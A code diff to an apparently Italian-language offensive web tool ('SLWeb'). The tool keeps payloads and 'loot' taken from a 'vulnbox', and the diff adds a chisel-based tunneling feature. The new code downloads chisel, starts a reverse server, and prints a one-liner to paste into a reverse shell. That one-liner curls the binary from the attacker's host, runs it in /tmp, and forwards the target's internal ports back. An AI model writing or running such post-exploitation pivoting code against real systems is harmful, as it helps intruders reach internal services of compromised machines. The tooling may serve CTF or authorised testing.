@@ -873,7 +873,9 @@ def _page_home() -> str:
     '  <span class="t-accent">static</span>      <span class="t-line">File manager per payload statici ({n_static} file)</span>\\n'+
     '              <span class="t-line">Crea, importa, modifica e scarica file serviti su /static/</span>\\n'+
     '  <span class="t-accent">loot</span>        <span class="t-line">File ricevuti dalla vulnbox ({n_loot} file)</span>\\n'+
-    '              <span class="t-line">Visualizza, scarica ed elimina i file caricati via curl /upload</span>\\n\\n'+
+    '              <span class="t-line">Visualizza, scarica ed elimina i file caricati via curl /upload</span>\\n'+
+    '  <span class="t-accent">tunnel</span>      <span class="t-line">Port forwarding via chisel per accedere a servizi interni</span>\\n'+
+    '              <span class="t-line">Mappa porte del target nel browser locale (tunnel help)</span>\\n\\n'+
     '  <span class="t-section">— Wordlists</span>\\n'+
     '  <span class="t-accent">wordfind</span>    <span class="t-line">Wizard wordlist — suggerisce liste e comandi per fuzzing/brute-force</span>\\n'+
     '  <span class="t-accent">wordgen</span>     <span class="t-line">Wizard creazione wordlist personalizzate (cewl, crunch, ecc.)</span>\\n'+
@@ -950,6 +952,19 @@ def _page_home() -> str:
       '<span class="t-line">Utile per verificare che il target stia effettivamente</span>\\n'+
       '<span class="t-line">scaricando i payload o caricando file.</span>\\n\\n'+
       '<span class="t-line">Digitando <span class="t-accent">logs</span> verrai portato alla pagina dei log.</span>',
+    tunnel:
+      '<span class="t-head">tunnel — Port Forwarding via chisel</span>\\n\\n'+
+      '<span class="t-line">Crea un tunnel per accedere a servizi interni del target</span>\\n'+
+      '<span class="t-line">(webapp su localhost, admin panel, ecc.) nel tuo browser.</span>\\n\\n'+
+      '<span class="t-line">Comandi:</span>\\n'+
+      '<span class="t-accent">  tunnel on &lt;porta&gt;</span>    <span class="t-line">Avvia tunnel per porta remota</span>\\n'+
+      '<span class="t-accent">  tunnel off</span>          <span class="t-line">Chiudi tutti i tunnel</span>\\n'+
+      '<span class="t-accent">  tunnel status</span>       <span class="t-line">Stato del server chisel</span>\\n'+
+      '<span class="t-accent">  tunnel list</span>         <span class="t-line">Elenca tunnel attivi</span>\\n'+
+      '<span class="t-accent">  tunnel fetch</span>        <span class="t-line">Scarica chisel in static/</span>\\n\\n'+
+      '<span class="t-line">Esempio:</span>\\n'+
+      '<span class="t-accent">  tunnel on 80</span> <span class="t-line">→ apri http://localhost:9000 nel browser</span>\\n\\n'+
+      '<span class="t-line">Opzioni: <span class="t-accent">--local-port</span> (default 9000), <span class="t-accent">--server-port</span> (default 8443)</span>',
     help:
       '<span class="t-head">help — Aiuto Comandi</span>\\n\\n'+
       '<span class="t-line">Mostra la lista dei comandi disponibili nel terminale SLWeb.</span>\\n\\n'+
@@ -1044,7 +1059,7 @@ def _page_home() -> str:
     }});
   }}
 
-  const allNames=[...cats.map(c=>c.name),'wordfind','wordgen','passfind','help','clear','version'];
+  const allNames=[...cats.map(c=>c.name),'tunnel','wordfind','wordgen','passfind','help','clear','version'];
   const helpSubs=Object.keys(CMD_HELP);
   function filter(){{
     const q=input.value.trim().toLowerCase();
@@ -1059,7 +1074,7 @@ def _page_home() -> str:
     }}
     const merged=allNames.filter(n=>n.startsWith(q)).map(n=>{{
       const c=cats.find(x=>x.name===n);if(c)return c;
-      const lb={{help:'Mostra comandi · help <cmd> per dettagli',clear:'Pulisci terminale',version:'Versione',wordfind:'Wizard wordlist fuzzing/brute-force',wordgen:'Wizard creazione wordlist',passfind:'Wizard password cracking'}};
+      const lb={{help:'Mostra comandi · help <cmd> per dettagli',clear:'Pulisci terminale',version:'Versione',tunnel:'Port forwarding via chisel',wordfind:'Wizard wordlist fuzzing/brute-force',wordgen:'Wizard creazione wordlist',passfind:'Wizard password cracking'}};
       return {{name:n,label:n.charAt(0).toUpperCase()+n.slice(1),cnt:lb[n]||'',href:null}};
     }});
     render(merged);
@@ -2375,3 +2390,153 @@ def clear_loot() -> str:
             f.unlink()
             count += 1
     return f"Eliminati {count} file dalla cartella loot/."
+
+
+# ---------------------------------------------------------------------------
+# Tunnel (chisel port-forwarding)
+# ---------------------------------------------------------------------------
+
+CHISEL_URL = "https://github.com/jpillora/chisel/releases/latest/download/chisel_{ver}_linux_amd64.gz"
+CHISEL_BIN = STATIC_ROOT / "chisel"
+
+_chisel_proc: subprocess.Popen | None = None
+_chisel_server_port: int = 0
+_tunnels: list[dict] = []
+
+
+def _chisel_latest_version() -> str:
+    """Get latest chisel version tag from GitHub."""
+    try:
+        out = subprocess.run(
+            ["curl", "-sI", "https://github.com/jpillora/chisel/releases/latest"],
+            capture_output=True, text=True, timeout=10,
+        )
+        for line in out.stdout.splitlines():
+            if line.lower().startswith("location:"):
+                return line.strip().rsplit("/", 1)[-1].lstrip("v")
+    except Exception:
+        pass
+    return "1.10.1"
+
+
+def tunnel_fetch(force: bool = False) -> str:
+    """Download chisel binary to static/."""
+    STATIC_ROOT.mkdir(parents=True, exist_ok=True)
+    if CHISEL_BIN.exists() and not force:
+        size = CHISEL_BIN.stat().st_size
+        return f"chisel già presente in static/ ({size // 1024} KB). Usa --force per riscaricare."
+
+    ver = _chisel_latest_version()
+    gz_url = f"https://github.com/jpillora/chisel/releases/download/v{ver}/chisel_{ver}_linux_amd64.gz"
+    gz_dest = STATIC_ROOT / "chisel.gz"
+
+    print(f"  Scaricamento chisel v{ver}...")
+    if not _download_file(gz_url, gz_dest):
+        return "[-] Download di chisel fallito."
+
+    import gzip
+    try:
+        with gzip.open(gz_dest, "rb") as gz, open(CHISEL_BIN, "wb") as out:
+            out.write(gz.read())
+        CHISEL_BIN.chmod(0o755)
+        gz_dest.unlink(missing_ok=True)
+        size = CHISEL_BIN.stat().st_size
+        return f"[+] chisel v{ver} scaricato ({size // 1024} KB) → static/chisel"
+    except Exception as e:
+        gz_dest.unlink(missing_ok=True)
+        return f"[-] Errore estrazione chisel: {e}"
+
+
+def tunnel_start(remote_port: int, local_port: int = 9000,
+                 server_port: int = 8443, lhost: str | None = None) -> str:
+    """Start chisel server and register a tunnel."""
+    global _chisel_proc, _chisel_server_port
+
+    if lhost is None:
+        lhost = _lhost or get_default_ip()
+
+    if not CHISEL_BIN.exists():
+        return ("[-] chisel non trovato in static/.\n"
+                "    Usa 'tunnel fetch' per scaricarlo.")
+
+    if _chisel_proc is not None and _chisel_proc.poll() is None:
+        for t in _tunnels:
+            if t["remote"] == remote_port:
+                return f"[-] Tunnel per la porta {remote_port} già attivo su localhost:{t['local']}."
+
+    if _chisel_proc is None or _chisel_proc.poll() is not None:
+        try:
+            _chisel_proc = subprocess.Popen(
+                [str(CHISEL_BIN), "server", "--reverse", "--port", str(server_port)],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
+            _chisel_server_port = server_port
+        except Exception as e:
+            return f"[-] Errore avvio chisel server: {e}"
+
+    tunnel_info = {"remote": remote_port, "local": local_port, "lhost": lhost}
+    _tunnels.append(tunnel_info)
+
+    serve_port = _server.server_address[1] if _server else 2727
+    base = f"http://{lhost}:{serve_port}"
+
+    lines = [
+        "",
+        f"  \033[92m[+] Chisel server attivo sulla porta {server_port}\033[0m",
+        f"  \033[92m[+] Tunnel registrato: target:{remote_port} → localhost:{local_port}\033[0m",
+        "",
+        "  \033[1mIncolla nella revshell:\033[0m",
+        "",
+        f"  \033[96mcurl {base}/static/chisel -o /tmp/chisel && chmod +x /tmp/chisel && "
+        f"/tmp/chisel client {lhost}:{server_port} R:{local_port}:127.0.0.1:{remote_port} &\033[0m",
+        "",
+        f"  \033[1mPoi apri nel browser:\033[0m  http://localhost:{local_port}",
+        "",
+    ]
+    return "\n".join(lines)
+
+
+def tunnel_stop() -> str:
+    """Stop chisel server and clear all tunnels."""
+    global _chisel_proc, _chisel_server_port
+    if _chisel_proc is None:
+        return "Nessun tunnel attivo."
+    try:
+        _chisel_proc.terminate()
+        _chisel_proc.wait(timeout=5)
+    except Exception:
+        _chisel_proc.kill()
+    _chisel_proc = None
+    _chisel_server_port = 0
+    count = len(_tunnels)
+    _tunnels.clear()
+    return f"Chisel server terminato. {count} tunnel chiusi."
+
+
+def tunnel_status() -> str:
+    """Return tunnel status."""
+    if _chisel_proc is None or _chisel_proc.poll() is not None:
+        return "Nessun tunnel attivo."
+    lines = [
+        f"\n  \033[92mChisel server:\033[0m attivo (porta {_chisel_server_port}, PID {_chisel_proc.pid})",
+    ]
+    if _tunnels:
+        lines.append(f"  \033[1mTunnel attivi:\033[0m {len(_tunnels)}")
+        for i, t in enumerate(_tunnels, 1):
+            lines.append(f"    [{i}] target:{t['remote']} → localhost:{t['local']}")
+    else:
+        lines.append("  Nessun tunnel registrato.")
+    lines.append("")
+    return "\n".join(lines)
+
+
+def tunnel_list() -> str:
+    """List active tunnels."""
+    if not _tunnels:
+        return "Nessun tunnel attivo."
+    lines = [f"\n  \033[1mTunnel attivi ({len(_tunnels)}):\033[0m\n"]
+    for i, t in enumerate(_tunnels, 1):
+        lines.append(f"    [{i}] target:{t['remote']} → \033[96mhttp://localhost:{t['local']}\033[0m")
+    lines.append("")
+    return "\n".join(lines)
